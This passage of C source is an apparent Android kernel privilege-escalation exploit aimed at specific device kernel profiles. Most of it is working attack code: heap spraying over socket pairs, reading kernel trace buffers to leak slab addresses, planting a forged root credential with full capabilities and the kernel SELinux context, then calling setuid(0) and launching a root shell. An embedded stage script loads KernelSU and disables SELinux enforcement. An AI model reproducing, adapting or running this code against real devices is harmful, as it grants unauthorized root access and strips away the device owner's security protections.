        "    d=$(dirname \"$(dirname \"$(dirname \"$c\")\")\")\n"
        "    b=$(basename \"$d\"); p=${b%%-*}\n"
        "    if [ -z \"$KSUD\" ]; then\n"
        "      KSUD=\"$c\"; PKG=\"$p\"; APK=\"$d/base.apk\"\n"
        "    fi\n"
        "    if [ -d \"/data/user/0/$p\" ] || "
        "[ -d \"/data/user_de/0/$p\" ]; then\n"
        "      KSUD=\"$c\"; PKG=\"$p\"; APK=\"$d/base.apk\"; break\n"
        "    fi\n"
        "  done\n"
        "fi\n"
        "if [ -z \"$KSUD\" ]; then\n"
        "  for c in $(find /data/app -path '*/lib/arm64/*.so' "
        "-size +2M 2>/dev/null); do\n"
        "    [ -x \"$c\" ] || continue\n"
        "    grep -aq 'late-load' \"$c\" 2>/dev/null || continue\n"
        "    grep -aq 'uapi' \"$c\" 2>/dev/null || continue\n"
        "    d=$(dirname \"$(dirname \"$(dirname \"$c\")\")\")\n"
        "    b=$(basename \"$d\"); p=${b%%-*}\n"
        "    if [ -z \"$KSUD\" ]; then\n"
        "      KSUD=\"$c\"; PKG=\"$p\"; APK=\"$d/base.apk\"\n"
        "    fi\n"
        "    if [ -d \"/data/user/0/$p\" ] || "
        "[ -d \"/data/user_de/0/$p\" ]; then\n"
        "      KSUD=\"$c\"; PKG=\"$p\"; APK=\"$d/base.apk\"; break\n"
        "    fi\n"
        "  done\n"
        "fi\n"
        "if [ -z \"$KSUD\" ]; then\n"
        "  for line in $(pm list packages --user 0 -f 2>/dev/null); do\n"
        "    a=${line#package:}; a=${a%=*}\n"
        "    c=$(lib_for \"$a\") || continue\n"
        "    KSUD=\"$c\"; APK=\"$a\"; PKG=${line##*=}\n"
        "    break\n"
        "  done\n"
        "fi\n"
        "if [ -z \"$KSUD\" ] && [ -n \"$APK\" ] && "
        "command -v unzip >/dev/null 2>&1; then\n"
        "  for e in lib/arm64-v8a/libksud.so lib/arm64/libksud.so; do\n"
        "    unzip -p \"$APK\" \"$e\" > /data/local/tmp/libksud.so 2>/dev/null\n"
        "    if [ -s /data/local/tmp/libksud.so ]; then\n"
        "      chmod 755 /data/local/tmp/libksud.so\n"
        "      KSUD=/data/local/tmp/libksud.so\n"
        "      break\n"
        "    fi\n"
        "  done\n"
        "fi\n"
        "if [ ! -x \"$KSUD\" ]; then\n"
        "  for c in /data/local/tmp/ksud /data/adb/ksu/bin/ksud; do\n"
        "    if [ -x \"$c\" ]; then KSUD=\"$c\"; break; fi\n"
        "  done\n"
        "fi\n"
        "if [ -z \"$PKG\" ]; then\n"
        "  for p in $PKGS; do\n"
        "    if pm list packages --user 0 2>/dev/null | "
        "grep -qx \"package:$p\"; then PKG=\"$p\"; break; fi\n"
        "  done\n"
        "fi\n"
        "[ -n \"$PKG\" ] || PKG=me.weishu.kernelsu\n"
        "if [ ! -x \"$KSUD\" ]; then\n"
        "  echo \"[ksu] ksud missing (tried: $PKGS, any user-0 package "
        "with libksud.so, /data/local/tmp/ksud, /data/adb/ksu/bin/ksud)\"\n"
        "  echo KSU_MISSING\n"
        "  exit 1\n"
        "fi\n"
        "KSUVER=$(\"$KSUD\" --version 2>&1 | head -n1)\n"
        "echo \"[ksu] manager=$PKG ksud=$KSUD version=$KSUVER\"\n"
        "loaded() { grep -q '^kernelsu ' /proc/modules; }\n"
        "try_load() {\n"
        "  echo \"[ksu] late-load $*\"\n"
        "  \"$KSUD\" late-load \"$@\" 2>&1\n"
        "  echo \"[ksu] late-load rc=$?\"\n"
        "  loaded && return 0\n"
        "  sleep 0.5\n"
        "  return 1\n"
        "}\n"
        "PRELOADED=0\n"
        "loaded && PRELOADED=1\n"
        "if [ \"$PRELOADED\" = 0 ]; then\n"
        "  try_load --kmi \"$KMI\" --allow-shell --package-name \"$PKG\" || \\\n"
        "  try_load --kmi \"$KMI\" --package-name \"$PKG\" || \\\n"
        "  try_load --allow-shell --package-name \"$PKG\" || \\\n"
        "  try_load --package-name \"$PKG\" || \\\n"
        "  try_load --kmi \"$KMI\" || \\\n"
        "  try_load\n"
        "fi\n"
        "i=0\n"
        "while [ $i -lt 100 ]; do\n"
        "  loaded && break\n"
        "  i=$((i+1)); sleep 0.1\n"
        "done\n"
        "if loaded; then\n"
        "  want=$(echo \"$KSUVER\" | "
        "sed -n 's/.*uapi: *\\([0-9][0-9]*\\).*/\\1/p')\n"
        "  got=$(\"$KSUD\" debug info 2>/dev/null | "
        "sed -n 's/^uapi_version: *\\([0-9][0-9]*\\).*/\\1/p')\n"
        "  echo \"[ksu] uapi manager=${want:-?} kernel=${got:-?} "
        "preloaded=$PRELOADED\"\n"
        "  if [ -n \"$want\" ] && [ -n \"$got\" ] && "
        "[ \"$want\" != \"$got\" ]; then\n"
        "    echo \"[ksu] loaded module is incompatible (uapi $got, "
        "manager needs $want); reboot, then run again\"\n"
        "    echo KSU_STALE\n"
        "  else\n"
        "    echo KSU_LOADED\n"
        "  fi\n"
        "else\n"
        "  echo KSU_MISSING\n"
        "fi\n"
        "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
        "echo \"[ksu] enforce=$(getenforce)\"\n";
    int fd = open("/data/local/tmp/ksu_stage.sh",
                  O_WRONLY | O_CREAT | O_TRUNC, 0755);

    if (fd < 0)
        return;
    (void)!write(fd, script, sizeof(script) - 1);
    close(fd);
    (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
}

static int read_panic_on_warn(void)
{
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
    int value = -1;

    if (f)
    {
        if (fscanf(f, "%d", &value) != 1)
            value = -1;
        fclose(f);
    }
    logf("[ksu] panic_on_warn=%d\n", value);
    return value;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw);

static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out)
{
    struct plant_res r;

    for (int attempt = 1; attempt <= 3; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
             mode == 2 ? "fake" : "zero", attempt);
        run_plant(target, 1, mode, &r, raw);
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        if (!r.retry)
        {
            logf("[-] stage %s failed\n", what);
            return -1;
        }
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

#define SPRAY_THREADS 8
#define SPRAY_SOCKS 2048
#define SPRAY_PRE 2000
#define SPRAY_POST 10000
static _Atomic int g_burst, g_burst2, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int sock_first, sock_count, cpu, idx;
};

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    if (!g_pool_n)
        park_forever("no spray sockets");
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

static int scan_page_alloc_ours(const unsigned char *b, size_t n,
                                unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        int pid;

        if (u64(b, i) != pfn || (int)u32(b, i + 8) != (int)SLAB_ORDER)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        pid = (int)u32(b, i - 4);
        for (int j = 0; j < SPRAY_THREADS; j++)
            if (pid == atomic_load(&g_spray_tids[j]))
                return 1;
    }
    return 0;
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin(a->cpu);
    while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
        sched_yield();
    if (atomic_load(&g_stop_spray))
        return NULL;
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    return NULL;
}

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw)
{
    unsigned long long ptrs[NTIMERS];
    unsigned long long pfn = 0, slab_pfn = 0;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
    memset(res, 0, sizeof(*res));
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
    {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        return;
    }
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    close(timer_go[0]);
    g_timer_go_w = timer_go[1];
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    long n = read_cpu(g_cpu, raw, 48u << 20);
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
        return;
    }
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (!base || base < LINEAR_MIN || base > LINEAR_MAX)
        {
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                 tag, base, ns, np, nrec);
            return;
        }
        g_base = base;
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < LINEAR_MAX)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & SLAB_MASK;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & SLAB_MASK) == vslab)
            slab_own++;
    {
        unsigned long long bpfn = 0;

        if (pair_slab_pfn(raw, (size_t)n, etid, vslab, &bpfn))
        {
            logf("[+] plant%d pair pfn=%#llx base_vote=%#llx pair_base=%#llx "
                 "agree=%d\n", tag, bpfn, g_base,
                 vslab - (bpfn << PAGE_SHIFT),
                 (vslab - (bpfn << PAGE_SHIFT)) == g_base);
            pfn = bpfn;
        }
        else
        {
            pfn = (V - g_base) >> PAGE_SHIFT;
            logf("[+] plant%d pair missing; base pfn=%#llx\n", tag, pfn);
        }
    }
    slab_pfn = pfn & ~((1ULL << SLAB_ORDER) - 1);
    g_slide = site0 - STATIC_TIMER_SITE;

    {
        size_t off = (size_t)((V & SLAB_OFF_MASK) + 0x78);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            return;
        }
        if (mode == 2)
        {
            unsigned long long page = V & SLAB_MASK;
            size_t cb = off + FAKE_CRED_OFF;
            size_t p = cb;
            unsigned long long *c = (unsigned long long *)(payload + cb);
            size_t blob = 0;
            size_t cand[] = {SLAB_SIZE - 0x100, SLAB_SIZE / 2,
                             SLAB_SIZE - SLAB_SIZE / 4, SLAB_SIZE / 4,
                             0x100, 0x0};
            int fit = 0;

            if (p + 0xb0 > SLAB_SIZE)
            {
                logf("[-] plant%d fake cred spills p=%#zx; retryable\n",
                     tag, p);
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
            {
                size_t b = cand[i];

                if (b + 0x40 > SLAB_SIZE)
                    continue;
                if (b + 0x40 <= off || cb + 0xb0 <= b)
                {
                    blob = b;
                    fit = 1;
                    break;
                }
            }
            if (!fit)
            {
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            build_payload(payload, off, V + 0x78 + FAKE_CRED_OFF, target);
            c[0] = 0x0000000000000001ULL;
            c[1] = 0;
            c[2] = 0;
            c[3] = 0;
            c[4] = 0;
            for (int i = 5; i <= 9; i++)
                c[i] = FULLCAP;
            c[10] = 0;
            *(unsigned long long *)(payload + cb + 0x78) =
                page + blob;
            *(unsigned long long *)(payload + cb + 0x80) =
                ROOT_USER_STATIC + g_slide;
            *(unsigned long long *)(payload + cb + 0x88) =
                INIT_USER_NS_STATIC + g_slide;
            *(unsigned long long *)(payload + cb + 0x90) =
                INIT_UCOUNTS_STATIC + g_slide;
            *(unsigned long long *)(payload + cb + 0x98) =
                INIT_GROUPS_STATIC + g_slide;
            for (int i = 0; i < 8; i++)
                *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF +
                                  i * 4) = SELINUX_SID_KERNEL;
            logf("[+] plant%d fake cred node=%#zx cb=%#zx blob=%#zx "
                 "sec=%#llx\n", tag, off, cb, blob, page + blob);
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d mode=%s V=%#llx node=%#llx fake=%#llx target=%#llx "
             "pfn=%#llx slab=%#llx slide=%#llx recs=%d slab_own=%d "
             "base=%#llx\n",
             tag, mode == 2 ? "fake" : "zero", V, V + 0x78,
             mode == 2 ? V + 0x78 + FAKE_CRED_OFF : 0, target,
             pfn, slab_pfn, g_slide, nrec, slab_own, g_base);
    }

    trace_start();
    logf("[+] plant%d trace restarted for pfn=%#llx\n", tag, slab_pfn);

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    {
        int per = g_pool_n / SPRAY_THREADS;

        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            args[i].sock_first = i * per;
            args[i].sock_count = per;
            args[i].cpu = i;
            args[i].idx = i;
            atomic_store(&g_spray_tids[i], -1);
            pthread_create(&th[i], NULL, spray_thread, &args[i]);
        }
    }
    atomic_store(&g_burst, 1);
    if (g_timer_go_w >= 0)
    {
        if (write(g_timer_go_w, "x", 1) != 1)
            logf("[-] timer go failed\n");
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }

    siginfo_t si;
    if (wait_zombie(T, &si))
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        logf("[-] plant%d no zombie; holding child\n", tag);
        g_held++;
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
    if (si.si_code != CLD_KILLED)
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            waitpid(T, &st, 0);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
        g_held++;
        return;
    }
    atomic_store(&g_burst, 1);
    atomic_store(&g_burst2, 1);
    long t1 = now_ms();
    int hit = 0;

    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < 8 && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

            if (m <= 0)
                continue;
            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            {
                hit = 1;
            }
            else if (!free_seen &&
                     scan_page_free(raw, (size_t)m, slab_pfn))
            {
                free_seen = 1;
                atomic_store(&g_burst2, 1);
            }
        }
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    for (int i = 0; i < SPRAY_THREADS; i++)
        pthread_join(th[i], NULL);
    trace_stop();
    for (int cpu = 0; cpu < 8 && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            hit = 1;
    }
    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
         tag, free_seen, hit, now_ms() - t1);
    if (!hit)
    {
        logf("[-] plant%d burst missed; holding zombie\n", tag);
        g_held++;
        return;
    }

    usleep(1000);
    logf("[+] plant%d reaping T=%d node=%#llx mode=%s payload_off=%#zx "
         "target=%#llx\n", tag, T, V + 0x78, mode == 2 ? "fake" : "zero",
         (size_t)((V & SLAB_OFF_MASK) + 0x78), target);
    int st = 0;
    waitpid(T, &st, 0);
    logf("[+] plant%d reaped status=%#x\n", tag, st);
    res->A = mode == 2 ? V + 0x78 + FAKE_CRED_OFF : V + 0x78;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : "zero", target);
    free(payload);
}

static void run_probe(unsigned char *raw)
{
    unsigned long long ptrs[NTIMERS], kept[NTIMERS];
    unsigned long long site0 = 0, V, vslab, pfn = 0;
    int ready_p[2], ack_p[2], tid_p[2];
    int nkeep = 0, nrec, slab_own = 0;

    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p))
        return;
    pid_t T = fork();
    if (T < 0)
        return;
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = -1;
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] probe trigger never ready\n");
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] probe ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] probe exec tid not received\n");

    long n = read_cpu(g_cpu, raw, 48u << 20);
    trace_stop();
    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (nrec && site0)
    {
        unsigned long long base = plant_base(raw, (size_t)n, etid, ptrs, nrec,
                                             &slab_own, &slab_own);

        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < LINEAR_MAX)
                kept[nkeep++] = ptrs[i];
        logf("[probe] recs=%d site=%#llx slide=%#llx base=%#llx kept=%d\n",
             nrec, site0, site0 - STATIC_TIMER_SITE, base, nkeep);
        {
            int a264 = 0, a256 = 0, a128 = 0;

            for (int i = 0; i < nkeep; i++)
            {
                unsigned long long o = kept[i] & SLAB_OFF_MASK;

                if (o % 264 == 0)
                    a264++;
                if (o % 256 == 0)
                    a256++;
                if (o % 128 == 0)
                    a128++;
            }
            logf("[probe] align mod264=%d mod256=%d mod128=%d of %d\n",
                 a264, a256, a128, nkeep);
        }
        if (nkeep > VICTIM_IDX)
        {
            V = kept[VICTIM_IDX];
            vslab = V & SLAB_MASK;
            logf("[probe] V=%#llx off=%#llx node_off=%#llx fake=%#llx "
                 "mod264=%llu mod256=%llu\n", V, V & SLAB_OFF_MASK,
                 (V & SLAB_OFF_MASK) + 0x78, (V & SLAB_OFF_MASK) + 0x90,
                 (V & SLAB_OFF_MASK) % 264, (V & SLAB_OFF_MASK) % 256);
            if (pair_slab_pfn(raw, (size_t)n, etid, vslab, &pfn))
                logf("[probe] pair pfn=%#llx pair_base=%#llx agree=%d\n",
                     pfn, vslab - (pfn << PAGE_SHIFT),
                     (vslab - (pfn << PAGE_SHIFT)) == base);
            else
                logf("[probe] pair missing\n");
        }
        else
        {
            logf("[-] probe victim index missing (kept=%d)\n", nkeep);
        }
    }
    else
    {
        logf("[-] probe victim not captured (recs=%d)\n", nrec);
    }
    kill(T, SIGKILL);
    waitpid(T, NULL, 0);
    logf("[probe] done; no timer armed, no stale node\n");
}

static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, tc = 0;
        unsigned long long R = 0, site = 0, task = 0;

        if (pipe(go) || pipe(st))
            return 0;
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                    (char *)cmode, NULL};
                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};

                execve("/proc/self/exe", av, ep);
            }
            _exit(127);
        }
        if (p < 0)
        {
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        if (n > 0)
        {
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
        }
        {
        int st;
        pid_t w = waitpid(p, &st, WNOHANG);
        if (w == p)
        logf("[cred] child %d died status=%#x\n", p, st);
        }
        if (R && (!g_fake_stage || task))
        {
            struct pollfd pf = {.fd = st[0], .events = POLLIN};

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO)
            {
                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                     "recs=%d task=%#llx task_recs=%d\n",
                     attempt, p, R, site & 0x1fffff, c, task, tc);
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                *task_out = task;
                return R;
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, tc);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

static int wait_child_main(const char *mode)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;

    pin(g_cpu);
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    if (read(3, &ch, 1) != 1)
        _exit(131);
    close(3);

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    rep.euid = (int)syscall(SYS_geteuid);
    logf("[child] woke uid=%d euid=%d mode=%s\n", rep.uid, rep.euid, mode);

    if (!strcmp(mode, "fake"))
    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};
        pid_t w;
        int st = 0;

        logf("[fake] parent uid=%d euid=%d; forking worker\n",
             rep.uid, rep.euid);
        w = fork();
        if (w == 0)
        {
            char *const av[] = {(char *)"sh",
                                (char *)"/data/local/tmp/ksu_stage.sh", NULL};
            long sg, su;
            uid_t ru = 0, eu = 0, suid = 0;
            int se;

            errno = 0;
            sg = syscall(SYS_setresgid, 0, 0, 0);
            se = errno;
            logf("[fake] worker setresgid(0)=%ld errno=%d\n", sg, se);
            errno = 0;
            su = syscall(SYS_setuid, 0);
            se = errno;
            getresuid(&ru, &eu, &suid);
            rep.setuid_ret = (int)su;
            rep.setuid_errno = se;
            rep.ruid = (int)ru;
            rep.reuid = (int)eu;
            rep.rsuid = (int)suid;
            (void)write(4, &rep, sizeof(rep));
            close(4);
            logf("[fake] worker setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid,
                 rep.rsuid);
            if (su != 0)
                _exit(4);
            execve("/system/bin/sh", av, envp);
            _exit(127);
        }
        if (w < 0)
        {
            rep.setuid_ret = -1;
            rep.setuid_errno = errno;
            (void)write(4, &rep, sizeof(rep));
        }
        close(4);
        if (w > 0)
            waitpid(w, &st, 0);
        logf("[fake] worker exit=%#x\n", st);
        _exit(0);
    }

    if (rep.uid != 0 && rep.euid != 0)
    {
        rep.setuid_ret = -1;
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child uid=%d euid=%d: cred writes did not land\n",
             rep.uid, rep.euid);
        _exit(3);
    }

    errno = 0;
    {
        long sg = syscall(SYS_setresgid, 0, 0, 0);

        logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
    }
    errno = 0;
    rep.setuid_ret = (int)syscall(SYS_setuid, 0);
    rep.setuid_errno = errno;
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
         rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
    if (rep.setuid_ret != 0 || rep.reuid != 0)
    {
        logf("[-] setuid(0) failed; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; echo ROOT_SHELL_OK; exec sh -i",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

/*
 * Profiles known to this binary, in preference order. Adding a new build is
 * just one more entry: fill in the struct, add it here, rebuild.
 */
static const struct target_profile *const g_profiles[] = {
    &profile_gt6t_1200,
    &profile_gt6t_1310,
};

#define NPROFILES (sizeof(g_profiles) / sizeof(g_profiles[0]))

static void detect_target(void)
{
    struct utsname u;
    char dev[PROP_VALUE_MAX];
    long ps;
    size_t i;

    if (uname(&u) == 0)
        snprintf(g_kernel, sizeof(g_kernel), "%s", u.release);

    dev[0] = '\0';
    if (__system_property_get("ro.product.device", dev) > 0 && dev[0])
        snprintf(g_device, sizeof(g_device), "%s", dev);

    for (i = 0; i < NPROFILES; i++)
    {
        if (strstr(g_kernel, g_profiles[i]->kernel_match))
        {
            g_tgt = g_profiles[i];
            break;
        }
    }

    logf("[+] device=%s kernel=%s\n", g_device, g_kernel);

    if (i == NPROFILES)
    {
        logf("[-] unsupported kernel \"%s\"\n", g_kernel);
        logf("[-] this build knows these profiles:\n");
